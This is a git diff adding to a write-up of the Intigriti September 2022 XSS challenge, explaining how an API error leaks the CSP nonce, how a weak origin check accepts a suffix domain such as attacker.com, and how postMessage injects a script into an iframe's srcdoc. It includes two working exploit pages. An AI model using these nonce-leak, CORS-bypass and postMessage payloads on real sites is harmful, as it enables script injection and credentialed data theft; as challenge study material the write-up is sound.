@@ -125,5 +125,94 @@ function buttonClick() {
     }
 </script>
 ```
-+ When we reload the script, we can see that the webpage is not a ball anymore,
++ When we reload the script, we can see that the webpage is not a ball anymore,but the srcdoc has been set in the iframe but it doesnt work anyomore
++ lets loook at the csp:
+    `<meta http-equiv="Content-Security-Policy" content="default-src 'self' blob: 'unsafe-inline' challenge-0922.intigriti.io; script-src 'nonce-2e59cb646b6b35a25e349525b60befd'; connect-src https:; object-src 'none'; base-uri 'none';">`
+![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/a6cdada9-3d24-4d21-b2bc-06c08c6d3d3e)
+but the csp doesnt seem to have any problems.
++ We need to guess the nounce inorder to continue, but the nounce are not really guessable.
++ Now lets look at the network tab. When I ask a question, it makes a request to an API.
++ Lets just visit api.php removing the question parameter to see what happens and we got this:
+![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/1f6164ff-4c82-4ec9-a515-90b3221b52a7)
++ And there we can see that there is a value that starts with `ey`. Base64 json usually starts with eyj. Lets base64 decode it see what it really is.
++ After base64 decoding and beautifying it we get the followjng:
+![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/2fa4fe4d-c4ea-46ac-8c24-dbf87f561fab)
++ We can see a value with the name csp. If we compare it with the nounce in our csp it is the same. So, the error message basically leaks the nounce.
++ If we get the nounce, we can supply it to the script element thus bypass the csp.
++ We modified the code for our page as follows:
+```
+<iframe id="challenge" src="https://challenge-0922.intigriti.io/challenge/index.php" onload="sendMessage()"></iframe>
+<script>
+    function getNounce(){
+        fetch("https://challenge-0922.intigriti.io/challenge/api.php")
+        .then(res=>res.text())
+        .then(res=>{
+            console.log(res);
+            const token=res.match(/eyJ[\w\d\/\+=]+/)[0];
+            const obj=JSON.parse(atob(token));
+            const nounce=obj.csp;
+            console.log(nounce);
+            sendMessage(nounce);
+        }).catch(console.error)
+    }
 
+    function sendMessage(nounce){
+        let challenge=document.getElementById('challenge');
+        challenge.contentWindow.postMessage({
+            action:'set',
+            element: '#ball',
+            attr: 'srcdoc',
+            value: '<script>alert(document.domain)<\/script>'
+        },'*');
+    }
+</script>
+```
++ When we console.log the response, we can see that we dont get the same base64 encoded string in the error page, this is because if we look at the response header of the api page from our localhost we can see that the following are the response headers:
+![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/5af536f9-fe4c-46e1-92a6-a56ba4744273)
++ But when we send the request from https://challenge-0922.intigriti.io/, we have the following response headers:
+![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/44196a22-af4b-41ed-8f53-19b162f7fd53)
++ We can see that when we send the request from th challenge.intigriti.io we can see a header called Access-control-allow-credentials, which is missing when we send the same request locally.
++ Read about the header here: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials
++ To sett the header locally we can do as follows:
+![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/feb36396-252e-404f-9a45-bfe924685738)
+But still it doesnt fix everything.
++ Lets look at burp:
++ Sending a normal request:
+![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/bc4affc6-8a67-4230-8616-243aeedf0da1)
++ When we send with an origin: something, the access-control-allow-origin will change from all(*) to attacker.com and credentials headers wont be there
+![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/12f19636-86c9-4945-8da9-9889555d062e)
++ If we set origin: challenge-0922.intigriti.io, we can see that access-control-allow-origin is set to that domain and we have the credentials.
+![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/e15f2918-8992-4d30-ac6b-c1c3cd422cf0)
++ if we set origin: challenge-0922.intigriti.io.attacker.com, we can see that the access-control-allow-origin is set to that domaina and credentials to true, so somewhere the check done to assure that the domain is challenge-0922.intigriti.io but it doesnt check it only challenge-0922.intigriti.io.
++ modified script:
+```
+<iframe id="challenge" src="https://challenge-0922.intigriti.io/challenge/index.php" onload="getNonce()"></iframe>
+<script>
+    function getNonce(){
+        fetch("https://challenge-0922.intigriti.io/challenge/api.php",{credentials:'include'})
+        .then(res=>res.text())
+        .then(res=>{
+            console.log(res);
+            const token=res.match(/eyJ[\w\d\/\+=]+/)[0];
+            const obj=JSON.parse(atob(token));
+            const nounce=obj.csp;
+            console.log(nounce);
+            sendMessage(nounce);
+        }).catch(console.error)
+    }
+
+    function sendMessage(nonce){
+        let challenge=document.getElementById('challenge');
+        challenge.contentWindow.postMessage({
+            action:'set',
+            element: '#ball',
+            attr: 'srcdoc',
+            value: '<script>parent.alert(document.domain)<\/script>'
+        },'*');
+    }
+</script>
+```
++ Now we have an xss, but this was only possible because we set the condition as below in burp:
+e.source == document.querySelector('#ball').contentWindow.
++ ![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/6be2fd9b-1748-4fbd-8d2f-8839b860ce8c)
+this is the line that is blocking us from getting xss. 
